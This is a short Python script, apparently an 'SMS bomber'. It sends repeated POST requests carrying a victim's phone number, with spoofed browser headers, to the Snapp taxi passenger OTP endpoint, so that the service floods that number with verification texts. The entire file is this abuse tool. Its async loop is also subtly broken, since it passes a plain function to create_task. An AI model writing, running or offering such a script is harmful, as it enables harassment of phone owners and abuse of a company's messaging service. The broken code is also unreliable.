import requests
import threading
import asyncio

def snap(phone):
    headers = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    json = {"cellphone":phone}
    try:
        requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=headers, json=json)
        return True
    except:
        return False

def send_sms(phone, count):
    loop = asyncio.get_event_loop()
    for i in range(count):
        tr = loop.create_task(snap(phone))
        print(tr)
